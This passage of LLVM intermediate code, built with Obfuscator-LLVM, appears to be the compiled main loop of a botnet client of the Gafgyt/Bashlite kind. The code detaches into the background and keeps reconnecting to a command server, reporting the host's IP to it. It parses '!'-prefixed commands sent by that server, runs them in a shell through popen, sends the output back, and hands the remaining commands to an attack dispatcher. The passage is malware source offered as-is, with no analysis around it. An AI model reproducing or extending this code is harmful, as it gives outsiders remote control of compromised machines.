  br i1 %129, label %133, label %130

; <label>:130:                                    ; preds = %122
  %131 = load i32, i32* %17, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %17, align 4
  br label %133

; <label>:133:                                    ; preds = %130, %122
  br label %117

; <label>:134:                                    ; preds = %117
  %135 = load i32, i32* %17, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %151

; <label>:137:                                    ; preds = %134
  %138 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %139 = call i32 @fclose(%struct._IO_FILE* %138)
  %140 = load i8*, i8** %12, align 8
  %141 = call %struct._IO_FILE* @fopen(i8* %140, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0))
  store %struct._IO_FILE* %141, %struct._IO_FILE** %18, align 8
  %142 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %143 = icmp ne %struct._IO_FILE* %142, null
  br i1 %143, label %144, label %150

; <label>:144:                                    ; preds = %137
  %145 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %146 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %147 = call i32 @fputs(i8* %145, %struct._IO_FILE* %146)
  %148 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %149 = call i32 @fclose(%struct._IO_FILE* %148)
  br label %150

; <label>:150:                                    ; preds = %144, %137
  br label %154

; <label>:151:                                    ; preds = %134
  %152 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %153 = call i32 @fclose(%struct._IO_FILE* %152)
  br label %154

; <label>:154:                                    ; preds = %151, %150
  br label %158

; <label>:155:                                    ; preds = %82
  %156 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %157 = call i32 @fclose(%struct._IO_FILE* %156)
  br label %158

; <label>:158:                                    ; preds = %155, %154
  br label %159

; <label>:159:                                    ; preds = %158, %79
  %160 = call i32 @getOurIP()
  %161 = call i32 @fork() #2
  %162 = icmp sgt i32 %161, 0
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %159
  ret i32 0

; <label>:164:                                    ; preds = %159
  %165 = call i32 @setsid() #2
  store i32 %165, i32* @pgid, align 4
  %166 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %167 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %168

; <label>:168:                                    ; preds = %459, %171, %164
  %169 = call i32 @initConnection()
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %173

; <label>:171:                                    ; preds = %168
  %172 = call i32 @sleep(i32 5)
  br label %168

; <label>:173:                                    ; preds = %168
  %174 = load i32, i32* @mainCommSock, align 4
  %175 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %176 = call i8* @inet_ntoa(i32 %175) #2
  %177 = call i32 (i32, i8*, ...) @sockprintf(i32 %174, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.140, i32 0, i32 0), i8* %176, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0))
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %178

; <label>:178:                                    ; preds = %458, %377, %299, %267, %173
  %179 = load i32, i32* @mainCommSock, align 4
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %181 = call i32 @recvLine(i32 %179, i8* %180, i32 4096)
  store i32 %181, i32* %20, align 4
  %182 = icmp ne i32 %181, -1
  br i1 %182, label %183, label %459

; <label>:183:                                    ; preds = %178
  store i32 0, i32* %21, align 4
  br label %184

; <label>:184:                                    ; preds = %255, %183
  %185 = load i32, i32* %21, align 4
  %186 = sext i32 %185 to i64
  %187 = load i64, i64* @numpids, align 8
  %188 = icmp ult i64 %186, %187
  br i1 %188, label %189, label %258

; <label>:189:                                    ; preds = %184
  %190 = load i32*, i32** @pids, align 8
  %191 = load i32, i32* %21, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i32, i32* %190, i64 %192
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @waitpid(i32 %194, i32* null, i32 1)
  %196 = icmp sgt i32 %195, 0
  br i1 %196, label %197, label %254

; <label>:197:                                    ; preds = %189
  %198 = load i32, i32* %21, align 4
  %199 = add nsw i32 %198, 1
  store i32 %199, i32* %23, align 4
  br label %200

; <label>:200:                                    ; preds = %216, %197
  %201 = load i32, i32* %23, align 4
  %202 = zext i32 %201 to i64
  %203 = load i64, i64* @numpids, align 8
  %204 = icmp ult i64 %202, %203
  br i1 %204, label %205, label %219

; <label>:205:                                    ; preds = %200
  %206 = load i32*, i32** @pids, align 8
  %207 = load i32, i32* %23, align 4
  %208 = zext i32 %207 to i64
  %209 = getelementptr inbounds i32, i32* %206, i64 %208
  %210 = load i32, i32* %209, align 4
  %211 = load i32*, i32** @pids, align 8
  %212 = load i32, i32* %23, align 4
  %213 = sub i32 %212, 1
  %214 = zext i32 %213 to i64
  %215 = getelementptr inbounds i32, i32* %211, i64 %214
  store i32 %210, i32* %215, align 4
  br label %216

; <label>:216:                                    ; preds = %205
  %217 = load i32, i32* %23, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %23, align 4
  br label %200

; <label>:219:                                    ; preds = %200
  %220 = load i32*, i32** @pids, align 8
  %221 = load i32, i32* %23, align 4
  %222 = sub i32 %221, 1
  %223 = zext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %220, i64 %223
  store i32 0, i32* %224, align 4
  %225 = load i64, i64* @numpids, align 8
  %226 = add i64 %225, -1
  store i64 %226, i64* @numpids, align 8
  %227 = load i64, i64* @numpids, align 8
  %228 = add i64 %227, 1
  %229 = mul i64 %228, 4
  %230 = call noalias i8* @malloc(i64 %229) #2
  %231 = bitcast i8* %230 to i32*
  store i32* %231, i32** %22, align 8
  store i32 0, i32* %23, align 4
  br label %232

; <label>:232:                                    ; preds = %247, %219
  %233 = load i32, i32* %23, align 4
  %234 = zext i32 %233 to i64
  %235 = load i64, i64* @numpids, align 8
  %236 = icmp ult i64 %234, %235
  br i1 %236, label %237, label %250

; <label>:237:                                    ; preds = %232
  %238 = load i32*, i32** @pids, align 8
  %239 = load i32, i32* %23, align 4
  %240 = zext i32 %239 to i64
  %241 = getelementptr inbounds i32, i32* %238, i64 %240
  %242 = load i32, i32* %241, align 4
  %243 = load i32*, i32** %22, align 8
  %244 = load i32, i32* %23, align 4
  %245 = zext i32 %244 to i64
  %246 = getelementptr inbounds i32, i32* %243, i64 %245
  store i32 %242, i32* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %237
  %248 = load i32, i32* %23, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %23, align 4
  br label %232

; <label>:250:                                    ; preds = %232
  %251 = load i32*, i32** @pids, align 8
  %252 = bitcast i32* %251 to i8*
  call void @free(i8* %252) #2
  %253 = load i32*, i32** %22, align 8
  store i32* %253, i32** @pids, align 8
  br label %254

; <label>:254:                                    ; preds = %250, %189
  br label %255

; <label>:255:                                    ; preds = %254
  %256 = load i32, i32* %21, align 4
  %257 = add nsw i32 %256, 1
  store i32 %257, i32* %21, align 4
  br label %184

; <label>:258:                                    ; preds = %184
  %259 = load i32, i32* %20, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %260
  store i8 0, i8* %261, align 1
  %262 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %262)
  %263 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %265 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %266 = icmp eq i8* %264, %265
  br i1 %266, label %267, label %270

; <label>:267:                                    ; preds = %258
  %268 = load i32, i32* @mainCommSock, align 4
  %269 = call i32 (i32, i8*, ...) @sockprintf(i32 %268, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0))
  br label %178

; <label>:270:                                    ; preds = %258
  %271 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %271, i8** %24, align 8
  %272 = load i8*, i8** %24, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 33
  br i1 %275, label %276, label %458

; <label>:276:                                    ; preds = %270
  %277 = load i8*, i8** %24, align 8
  %278 = getelementptr inbounds i8, i8* %277, i64 1
  store i8* %278, i8** %25, align 8
  br label %279

; <label>:279:                                    ; preds = %291, %276
  %280 = load i8*, i8** %25, align 8
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp ne i32 %282, 32
  br i1 %283, label %284, label %289

; <label>:284:                                    ; preds = %279
  %285 = load i8*, i8** %25, align 8
  %286 = load i8, i8* %285, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp ne i32 %287, 0
  br label %289

; <label>:289:                                    ; preds = %284, %279
  %290 = phi i1 [ false, %279 ], [ %288, %284 ]
  br i1 %290, label %291, label %294

; <label>:291:                                    ; preds = %289
  %292 = load i8*, i8** %25, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %25, align 8
  br label %279

; <label>:294:                                    ; preds = %289
  %295 = load i8*, i8** %25, align 8
  %296 = load i8, i8* %295, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 0
  br i1 %298, label %299, label %300

; <label>:299:                                    ; preds = %294
  br label %178

; <label>:300:                                    ; preds = %294
  %301 = load i8*, i8** %25, align 8
  store i8 0, i8* %301, align 1
  %302 = load i8*, i8** %24, align 8
  %303 = getelementptr inbounds i8, i8* %302, i64 1
  store i8* %303, i8** %25, align 8
  %304 = load i8*, i8** %24, align 8
  %305 = load i8*, i8** %25, align 8
  %306 = call i64 @strlen(i8* %305) #10
  %307 = getelementptr inbounds i8, i8* %304, i64 %306
  %308 = getelementptr inbounds i8, i8* %307, i64 2
  store i8* %308, i8** %24, align 8
  br label %309

; <label>:309:                                    ; preds = %329, %300
  %310 = load i8*, i8** %24, align 8
  %311 = load i8*, i8** %24, align 8
  %312 = call i64 @strlen(i8* %311) #10
  %313 = sub i64 %312, 1
  %314 = getelementptr inbounds i8, i8* %310, i64 %313
  %315 = load i8, i8* %314, align 1
  %316 = zext i8 %315 to i32
  %317 = icmp eq i32 %316, 10
  br i1 %317, label %327, label %318

; <label>:318:                                    ; preds = %309
  %319 = load i8*, i8** %24, align 8
  %320 = load i8*, i8** %24, align 8
  %321 = call i64 @strlen(i8* %320) #10
  %322 = sub i64 %321, 1
  %323 = getelementptr inbounds i8, i8* %319, i64 %322
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp eq i32 %325, 13
  br label %327

; <label>:327:                                    ; preds = %318, %309
  %328 = phi i1 [ true, %309 ], [ %326, %318 ]
  br i1 %328, label %329, label %335

; <label>:329:                                    ; preds = %327
  %330 = load i8*, i8** %24, align 8
  %331 = load i8*, i8** %24, align 8
  %332 = call i64 @strlen(i8* %331) #10
  %333 = sub i64 %332, 1
  %334 = getelementptr inbounds i8, i8* %330, i64 %333
  store i8 0, i8* %334, align 1
  br label %309

; <label>:335:                                    ; preds = %327
  %336 = load i8*, i8** %24, align 8
  store i8* %336, i8** %26, align 8
  br label %337

; <label>:337:                                    ; preds = %349, %335
  %338 = load i8*, i8** %24, align 8
  %339 = load i8, i8* %338, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp ne i32 %340, 32
  br i1 %341, label %342, label %347

; <label>:342:                                    ; preds = %337
  %343 = load i8*, i8** %24, align 8
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp ne i32 %345, 0
  br label %347

; <label>:347:                                    ; preds = %342, %337
  %348 = phi i1 [ false, %337 ], [ %346, %342 ]
  br i1 %348, label %349, label %352

; <label>:349:                                    ; preds = %347
  %350 = load i8*, i8** %24, align 8
  %351 = getelementptr inbounds i8, i8* %350, i32 1
  store i8* %351, i8** %24, align 8
  br label %337

; <label>:352:                                    ; preds = %347
  %353 = load i8*, i8** %24, align 8
  store i8 0, i8* %353, align 1
  %354 = load i8*, i8** %24, align 8
  %355 = getelementptr inbounds i8, i8* %354, i32 1
  store i8* %355, i8** %24, align 8
  %356 = load i8*, i8** %26, align 8
  store i8* %356, i8** %27, align 8
  br label %357

; <label>:357:                                    ; preds = %361, %352
  %358 = load i8*, i8** %27, align 8
  %359 = load i8, i8* %358, align 1
  %360 = icmp ne i8 %359, 0
  br i1 %360, label %361, label %370

; <label>:361:                                    ; preds = %357
  %362 = load i8*, i8** %27, align 8
  %363 = load i8, i8* %362, align 1
  %364 = zext i8 %363 to i32
  %365 = call i32 @toupper(i32 %364) #10
  %366 = trunc i32 %365 to i8
  %367 = load i8*, i8** %27, align 8
  store i8 %366, i8* %367, align 1
  %368 = load i8*, i8** %27, align 8
  %369 = getelementptr inbounds i8, i8* %368, i32 1
  store i8* %369, i8** %27, align 8
  br label %357

; <label>:370:                                    ; preds = %357
  %371 = load i8*, i8** %26, align 8
  %372 = call i32 @strcmp(i8* %371, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.143, i32 0, i32 0)) #10
  %373 = icmp eq i32 %372, 0
  br i1 %373, label %374, label %400

; <label>:374:                                    ; preds = %370
  %375 = call i32 @listFork()
  %376 = icmp ne i32 %375, 0
  br i1 %376, label %377, label %378

; <label>:377:                                    ; preds = %374
  br label %178

; <label>:378:                                    ; preds = %374
  %379 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %379, i8 0, i64 1024, i32 16, i1 false)
  %380 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %381 = load i8*, i8** %24, align 8
  %382 = call i32 (i8*, i8*, ...) @szprintf(i8* %380, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0), i8* %381)
  %383 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %384 = call i32 @fdpopen(i8* %383, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store i32 %384, i32* %29, align 4
  br label %385

; <label>:385:                                    ; preds = %390, %378
  %386 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %387 = load i32, i32* %29, align 4
  %388 = call i8* @fdgets(i8* %386, i32 1024, i32 %387)
  %389 = icmp ne i8* %388, null
  br i1 %389, label %390, label %397

; <label>:390:                                    ; preds = %385
  %391 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %391)
  %392 = load i32, i32* @mainCommSock, align 4
  %393 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %394 = call i32 (i32, i8*, ...) @sockprintf(i32 %392, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.145, i32 0, i32 0), i8* %393)
  %395 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %395, i8 0, i64 1024, i32 16, i1 false)
  %396 = call i32 @sleep(i32 1)
  br label %385

; <label>:397:                                    ; preds = %385
  %398 = load i32, i32* %29, align 4
  %399 = call i32 @fdpclose(i32 %398)
  call void @exit(i32 0) #14
  unreachable

; <label>:400:                                    ; preds = %370
  store i32 1, i32* %31, align 4
  %401 = load i8*, i8** %24, align 8
  %402 = call i8* @strtok(i8* %401, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %402, i8** %32, align 8
  %403 = load i8*, i8** %26, align 8
  %404 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %403, i8** %404, align 16
  br label %405

; <label>:405:                                    ; preds = %436, %400
  %406 = load i8*, i8** %32, align 8
  %407 = icmp ne i8* %406, null
  br i1 %407, label %408, label %438

; <label>:408:                                    ; preds = %405
  %409 = load i8*, i8** %32, align 8
  %410 = load i8, i8* %409, align 1
  %411 = zext i8 %410 to i32
  %412 = icmp ne i32 %411, 10
  br i1 %412, label %413, label %436

; <label>:413:                                    ; preds = %408
  %414 = load i8*, i8** %32, align 8
  %415 = call i64 @strlen(i8* %414) #10
  %416 = add i64 %415, 1
  %417 = call noalias i8* @malloc(i64 %416) #2
  %418 = load i32, i32* %31, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %419
  store i8* %417, i8** %420, align 8
  %421 = load i32, i32* %31, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %422
  %424 = load i8*, i8** %423, align 8
  %425 = load i8*, i8** %32, align 8
  %426 = call i64 @strlen(i8* %425) #10
  %427 = add i64 %426, 1
  call void @llvm.memset.p0i8.i64(i8* %424, i8 0, i64 %427, i32 1, i1 false)
  %428 = load i32, i32* %31, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %429
  %431 = load i8*, i8** %430, align 8
  %432 = load i8*, i8** %32, align 8
  %433 = call i8* @strcpy(i8* %431, i8* %432) #2
  %434 = load i32, i32* %31, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %31, align 4
  br label %436

; <label>:436:                                    ; preds = %413, %408
  %437 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %437, i8** %32, align 8
  br label %405

; <label>:438:                                    ; preds = %405
  %439 = load i32, i32* %31, align 4
  %440 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %439, i8** %440)
  %441 = load i32, i32* %31, align 4
  %442 = icmp sgt i32 %441, 1
  br i1 %442, label %443, label %457

; <label>:443:                                    ; preds = %438
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %444

; <label>:444:                                    ; preds = %453, %443
  %445 = load i32, i32* %33, align 4
  %446 = load i32, i32* %31, align 4
  %447 = icmp slt i32 %445, %446
  br i1 %447, label %448, label %456

; <label>:448:                                    ; preds = %444
  %449 = load i32, i32* %33, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %450
  %452 = load i8*, i8** %451, align 8
  call void @free(i8* %452) #2
  br label %453

; <label>:453:                                    ; preds = %448
  %454 = load i32, i32* %33, align 4
  %455 = add nsw i32 %454, 1
  store i32 %455, i32* %33, align 4
  br label %444

; <label>:456:                                    ; preds = %444
  br label %457

; <label>:457:                                    ; preds = %456, %438
  br label %458

; <label>:458:                                    ; preds = %457, %270
  br label %178

; <label>:459:                                    ; preds = %178
  br label %168
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612692}
!2 = !{i32 -2146611984}
!3 = !{i32 -2146611287}
!4 = !{i32 -2146610396}
!5 = !{i32 -2146609669}
!6 = !{i32 -2146608844}